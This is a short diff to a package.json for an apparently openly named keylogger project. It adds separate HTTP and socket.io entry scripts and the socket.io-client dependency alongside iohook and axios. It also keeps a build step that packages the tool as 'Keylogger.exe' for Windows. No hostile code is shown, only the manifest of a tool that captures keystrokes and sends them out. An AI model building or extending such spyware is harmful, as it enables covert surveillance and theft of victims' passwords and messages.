@@ -6,7 +6,8 @@
   "bin": "./src/index.js",
   "scripts": {
     "test": "echo \"Error: no test specified\" && exit 1",
-    "start": "node ./src/index.js",
+    "http": "node ./src/httpVersion.js",
+    "socket": "node ./src/socketVersion.js",
     "pkg": "pkg . -t node14-win-x64 -o Keylogger.exe"
   },
   "keywords": [],
@@ -14,7 +15,8 @@
   "license": "ISC",
   "dependencies": {
     "axios": "^0.27.2",
-    "iohook": "^0.6.6"
+    "iohook": "^0.6.6",
+    "socket.io-client": "^4.6.1"
   },
   "devDependencies": {
     "pkg": "^5.8.1"
